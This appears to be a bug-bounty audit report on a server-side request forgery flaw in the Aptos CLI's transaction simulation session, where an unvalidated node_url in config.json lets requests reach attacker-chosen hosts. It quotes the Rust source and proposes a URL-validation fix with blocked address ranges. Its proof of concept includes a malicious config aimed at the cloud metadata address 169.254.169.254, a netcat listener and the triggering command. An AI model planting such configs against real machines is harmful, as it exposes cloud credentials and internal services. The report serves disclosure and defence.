# Audit Report

## Title
Server-Side Request Forgery (SSRF) via Unvalidated node_url in Transaction Simulation Session Configuration

## Summary
The transaction simulation session module allows loading configuration files containing arbitrary URLs without validation. When a malicious `config.json` file is loaded, the system creates an HTTP client that makes requests to attacker-controlled destinations, enabling Server-Side Request Forgery (SSRF) attacks against internal services, cloud metadata endpoints, and local network resources.

## Finding Description

The vulnerability exists in the configuration loading and session initialization flow: [1](#0-0) 

The `Config::load_from_file` method deserializes a JSON configuration file that may contain a `BaseState::Remote` variant with an arbitrary `node_url` field. The `url::Url` type performs syntactic parsing but does not validate the security implications of the URL scheme, host, or IP address. [2](#0-1) 

When `Session::load()` processes a config with `BaseState::Remote`, it directly uses the `node_url` to create an HTTP client without any security validation: [3](#0-2) 

The HTTP client is constructed using reqwest with minimal security controls: [4](#0-3) 

This client configuration lacks:
- URL scheme validation (allows http://, file://, etc.)
- Host/IP address allowlisting (permits 127.0.0.1, 169.254.169.254, internal IPs)
- Redirect policy configuration (defaults to following up to 10 redirects)

The client then makes HTTP requests to construct URLs like: [5](#0-4) [6](#0-5) 

**Attack Scenario:**

1. Attacker crafts a malicious `config.json`:
```json
{
  "base": {
    "Remote": {
      "node_url": "http://169.254.169.254/",
      "network_version": 1,
      "api_key": null
    }
  },
  "ops": 0
}
```

2. Attacker distributes this config via shared repositories, tutorials, or sample code

3. Victim loads the session: `aptos move sim --session ./malicious-session`

4. When the session accesses remote state through `DebuggerStateView`: [7](#0-6) 

The system makes HTTP POST requests to `http://169.254.169.254/v1/experimental/state_values/raw?ledger_version=X`, potentially exposing AWS/GCP metadata endpoints, internal API keys, and cloud credentials.

## Impact Explanation

**Severity: High**

While this vulnerability exists in a CLI development tool rather than core validator software, it meets High severity criteria because:

1. **API Security Compromise**: The SSRF can be leveraged to access internal REST APIs, potentially causing API crashes or exposing sensitive endpoints as specified in the High severity category ("API crashes").

2. **Indirect Node Impact**: If validator operators or infrastructure teams run this tool on production infrastructure (a realistic operational scenario during debugging or testing), the SSRF could:
   - Access internal validator management APIs
   - Retrieve cloud instance metadata containing credentials
   - Port-scan and map internal network topology
   - Access localhost services (databases, monitoring systems)

3. **Information Disclosure**: The vulnerability enables exfiltration of sensitive data including:
   - Cloud provider credentials (AWS/GCP/Azure metadata endpoints)
   - Internal API keys and tokens
   - Network configuration and service discovery

## Likelihood Explanation

**Likelihood: Medium-High**

The exploitation is realistic and requires minimal sophistication:

1. **Attack Vector**: Social engineering to distribute malicious session directories through:
   - GitHub repositories with example code
   - Developer tutorials and documentation
   - Shared workspace directories
   - Package distribution channels

2. **Low Barrier**: No specialized knowledge required beyond basic HTTP understanding

3. **Common Patterns**: Developers frequently share and load session configurations when collaborating on Move smart contract development

4. **Trust Assumptions**: Developers typically trust configuration files from tutorials, documentation, or colleagues without manual inspection

## Recommendation

Implement URL validation in the configuration loading process:

```rust
// In config.rs
use std::net::IpAddr;

impl Config {
    pub fn load_from_file(path: &std::path::Path) -> Result<Self> {
        let json = std::fs::read_to_string(path)?;
        let config: Self = serde_json::from_str(&json)?;
        
        // Validate remote URLs
        if let BaseState::Remote { node_url, .. } = &config.base {
            validate_node_url(node_url)?;
        }
        
        Ok(config)
    }
}

fn validate_node_url(url: &Url) -> Result<()> {
    // Only allow https scheme
    if url.scheme() != "https" {
        anyhow::bail!("Only HTTPS URLs are allowed for remote state (got: {})", url.scheme());
    }
    
    // Block private/internal IP ranges
    if let Some(host) = url.host_str() {
        // Block localhost
        if host == "localhost" || host == "127.0.0.1" || host == "[::1]" {
            anyhow::bail!("Localhost URLs are not allowed for remote state");
        }
        
        // Block private IP ranges
        if let Ok(ip) = host.parse::<IpAddr>() {
            if is_private_ip(&ip) {
                anyhow::bail!("Private IP addresses are not allowed for remote state");
            }
        }
        
        // Block cloud metadata endpoints
        if host.starts_with("169.254.") || host == "169.254.169.254" {
            anyhow::bail!("Cloud metadata endpoints are not allowed for remote state");
        }
    }
    
    Ok(())
}

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() || ipv4.is_loopback() || ipv4.is_link_local()
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() || ipv6.is_unique_local()
        },
    }
}
```

Additionally, configure the reqwest client with stricter security policies:

```rust
// In client_builder.rs
pub fn build(self) -> Client {
    Client {
        inner: self
            .reqwest_builder
            .default_headers(self.headers)
            .timeout(self.timeout)
            .cookie_store(true)
            .redirect(reqwest::redirect::Policy::limited(3)) // Limit redirects
            .build()
            .unwrap(),
        base_url: self.base_url,
        version_path_base,
    }
}
```

## Proof of Concept

**Step 1: Create malicious config.json**
```bash
mkdir -p /tmp/malicious-session
cat > /tmp/malicious-session/config.json << 'EOF'
{
  "base": {
    "Remote": {
      "node_url": "http://169.254.169.254/",
      "network_version": 1,
      "api_key": null
    }
  },
  "ops": 0
}
EOF

echo "{}" > /tmp/malicious-session/delta.json
```

**Step 2: Set up listener to capture SSRF**
```bash
# On attacker machine or localhost
nc -lvnp 8080
```

**Step 3: Modify config to point to attacker**
```bash
cat > /tmp/malicious-session/config.json << 'EOF'
{
  "base": {
    "Remote": {
      "node_url": "http://127.0.0.1:8080/",
      "network_version": 1,
      "api_key": null
    }
  },
  "ops": 0
}
EOF
```

**Step 4: Load the malicious session**
```bash
# This will attempt to make HTTP requests to the malicious URL
aptos move sim --session /tmp/malicious-session view-resource \
  --account 0x1 \
  --resource 0x1::account::Account
```

**Expected Result**: The netcat listener receives HTTP POST requests to `/v1/experimental/state_values/raw`, demonstrating successful SSRF exploitation.

**Notes**

This vulnerability represents a violation of secure coding practices where external input (the `node_url` field from a JSON configuration file) is used to make network requests without validation. The security impact is amplified by the lack of HTTP client hardening (no redirect policy, permissive schemes).

While the transaction simulation session is a development tool rather than production validator software, the realistic exploitation path through shared configurations and the potential for use in production-adjacent environments (CI/CD, staging infrastructure) warrant High severity classification under the "API crashes" and "significant protocol violations" categories of the bug bounty program.

### Citations

**File:** aptos-move/aptos-transaction-simulation-session/src/config.rs (L16-20)
```rust
    Remote {
        node_url: Url,
        network_version: u64,
        api_key: Option<String>,
    },
```

**File:** aptos-move/aptos-transaction-simulation-session/src/config.rs (L62-67)
```rust
    /// Loads the configuration from a file.
    pub fn load_from_file(path: &std::path::Path) -> Result<Self> {
        let json = std::fs::read_to_string(path)?;
        let config = serde_json::from_str(&json)?;
        Ok(config)
    }
```

**File:** aptos-move/aptos-transaction-simulation-session/src/session.rs (L206-222)
```rust
            BaseState::Remote {
                node_url,
                network_version,
                api_key,
            } => {
                let mut builder = Client::builder(AptosBaseUrl::Custom(node_url.clone()));
                if let Some(api_key) = api_key {
                    builder = builder.api_key(api_key)?;
                }
                let client = builder.build();

                let debugger = DebuggerStateView::new(
                    Arc::new(RestDebuggerInterface::new(client)),
                    *network_version,
                );
                EitherStateView::Right(debugger)
            },
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L95-109)
```rust
    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1558-1573)
```rust
    pub async fn get_raw_state_value(
        &self,
        state_key: &StateKey,
        version: u64,
    ) -> AptosResult<Response<Vec<u8>>> {
        let url = self.build_path(&format!(
            "experimental/state_values/raw?ledger_version={}",
            version
        ))?;
        let data = json!({
            "key": hex::encode(bcs::to_bytes(state_key)?),
        });

        let response = self.post_bcs(url, data).await?;
        Ok(response.map(|inner| inner.to_vec()))
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L1683-1689)
```rust
    async fn get<T: DeserializeOwned>(&self, url: Url) -> AptosResult<Response<T>> {
        self.json(self.inner.get(url).send().await?).await
    }

    async fn get_bcs(&self, url: Url) -> AptosResult<Response<bytes::Bytes>> {
        let response = self.inner.get(url).header(ACCEPT, BCS).send().await?;
        self.check_and_parse_bcs_response(response).await
```

**File:** aptos-move/aptos-validator-interface/src/rest_interface.rs (L199-219)
```rust
    async fn get_state_value_by_version(
        &self,
        state_key: &StateKey,
        version: Version,
    ) -> Result<Option<StateValue>> {
        match self.0.get_raw_state_value(state_key, version).await {
            Ok(resp) => Ok(Some(bcs::from_bytes(&resp.into_inner())?)),
            Err(err) => match err {
                RestError::Api(AptosErrorResponse {
                    error:
                        AptosError {
                            error_code:
                                AptosErrorCode::StateValueNotFound | AptosErrorCode::TableItemNotFound, /* bug in pre 1.9 nodes */
                            ..
                        },
                    ..
                }) => Ok(None),
                _ => Err(anyhow!(err)),
            },
        }
    }
```
